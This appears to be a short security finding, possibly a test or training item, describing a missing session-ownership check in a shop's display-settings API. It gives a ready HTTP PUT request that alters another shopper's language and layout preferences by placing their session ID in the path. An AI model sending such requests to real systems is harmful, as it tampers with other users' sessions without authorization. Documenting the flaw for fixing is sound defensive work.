diagnosis: The shopping preferences controller writes display settings into Redis session attributes based on the path variable sessionId without verifying that the targeted session matches the caller's active HTTP session. Users can tamper with the language and layout preferences of other concurrent shoppers.
exploit_request:
PUT /api/session/state/sess_cart_visitor_9918/display-settings HTTP/1.1
Host: shop.globalretail.com
Cookie: SESSION=sess_cart_visitor_1102
Content-Type: application/json

{"preferredLanguage": "fr-CA", "compactMode": true}
